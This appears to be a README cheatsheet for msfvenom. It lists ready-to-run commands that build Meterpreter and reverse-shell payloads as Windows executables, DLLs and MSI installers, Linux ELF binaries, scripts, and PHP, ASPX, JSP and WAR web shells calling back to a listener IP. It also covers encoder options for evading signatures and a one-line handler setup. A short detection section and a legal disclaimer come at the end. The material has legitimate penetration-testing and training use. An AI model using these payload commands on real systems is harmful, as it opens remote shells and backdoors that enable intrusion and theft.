# 💣 Msfvenom - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```

<p align="center">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Payloads">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="Formats">
</p>

<p align="center">
  <b>💣 Master cheatsheet for generating standalone payloads, shellcode, and backdoors across Windows, Linux, macOS, Android, and Web platforms</b>
</p>

---

## 📋 Table of Contents

- [Overview & Payload Architecture](#-overview--payload-architecture)
  - [Staged vs Stageless Payloads](#staged-vs-stageless-payloads)
- [Essential Flags & Options](#-essential-flags--options)
- [Windows Payloads (EXE, DLL, MSI, PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [Linux & Unix Payloads (ELF, Python, Bash)](#-linux--unix-payloads-elf-python-bash)
- [Web & Web Shell Payloads (PHP, ASP, ASPX, JSP, WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [Shellcode Generation for Exploit Development (C, Raw, Python)](#-shellcode-generation-for-exploit-development-c-raw-python)
  - [Stripping Bad Characters (`-b`)](#stripping-bad-characters--b)
  - [Encoders & Multiple Iterations (`-e`, `-i`)](#encoders--multiple-iterations--e--i)
- [Metasploit Multi-Handler Quick Setup](#-metasploit-multi-handler-quick-setup)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & Payload Architecture

Combining the classic `msfpayload` and `msfencode` utilities, **msfvenom** generates binary executables, scripts, and raw shellcode for exploitation and penetration testing.

### Staged vs Stageless Payloads
- **Staged (e.g. `windows/x64/meterpreter/reverse_tcp`):**
  Uses slashes between components. A tiny stub (stage 0) connects back to the listener and fetches the full reflective DLL (stage 1) into memory. Ideal for exploits with strict buffer length limits.
- **Stageless (e.g. `windows/x64/meterpreter_reverse_tcp`):**
  Uses an underscore (`_`). The entire Meterpreter payload is self-contained inside the executable or shellcode. Works reliably without relying on multi-stage network handshakes, making it ideal for command line runners and evasive persistence.

---

## ⚙️ Essential Flags & Options

```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```

| Flag | Description |
|------|-------------|
| `-p, --payload` | Specifies the payload to use (`--list payloads` to view all). |
| `-f, --format` | Output format (exe, elf, raw, c, python, asp, aspx, war, php). |
| `-e, --encoder` | Shellcode encoder to eliminate bad characters (`--list encoders`). |
| `-i, --iterations` | Number of encoding passes. |
| `-b, --bad-chars` | Characters to avoid in shellcode (e.g., `\x00\x0a\x0d`). |
| `-x, --template` | Executable template to inject payload into. |
| `-k, --keep` | Preserves template's normal execution in a new thread. |
| `-o, --out` | Output destination file path. |

---

## 🪟 Windows Payloads (EXE, DLL, MSI, PowerShell)

### Windows x64 Reverse Shell Executable (Stageless)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

### Windows x64 Staged Reverse TCP Executable
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```

### Windows DLL Injection Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```

### Windows MSI Installer (Privilege Escalation via AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```

### Base64 Encoded PowerShell Command
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```

---

## 🐧 Linux & Unix Payloads (ELF, Python, Bash)

### Linux x64 ELF Binary (Stageless)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```

### Linux Standard `/bin/sh` Reverse TCP (No Meterpreter)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```

### Standalone Python Reverse Shell Script
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```

### Pure Bash Command String
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```

---

## 🌐 Web & Web Shell Payloads (PHP, ASP, ASPX, JSP, WAR)

### PHP Reverse Meterpreter Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```

### Classic ASP & ASPX (IIS Servers)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

### Java WAR Package (Apache Tomcat Web Archive)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```

---

## 🔬 Shellcode Generation for Exploit Development (C, Raw, Python)

### Stripping Bad Characters (`-b`)
Null bytes (`\x00`), carriage returns (`\r` = `\x0d`), and newlines (`\n` = `\x0a`) break string-based memory corruption exploits (e.g., stack overflows):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```

### Encoders & Multiple Iterations (`-e`, `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```

---

## 🎧 Metasploit Multi-Handler Quick Setup

Always catch payloads using Metasploit's `multi/handler`:

```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

---

## ⚡ Quick Reference Table

| Target Platform | Command |
|-----------------|---------|
| **Windows x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **Linux x64 ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| **PHP Web Shell** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| **ASPX (.NET IIS)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| **Tomcat WAR** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| **Raw Shellcode (C)**| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ Defensive Considerations & Detection

1. **Static Signature Detection:** Default Msfvenom templates and encoders (`shikata_ga_nai`) have well-known static signatures identified by virtually every modern antivirus engine.
2. **Behavioral EDR Monitoring:** EDR agents flag abnormal process spawning (e.g. `cmd.exe` or `powershell.exe` spawned under `w3wp.exe` or `tomcat8.exe`).

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> Msfvenom generates functional offensive payloads and backdoors. It must strictly be utilized during authorized penetration tests and within isolated laboratory research environments. Unauthorized generation or execution on third-party computers is illegal.
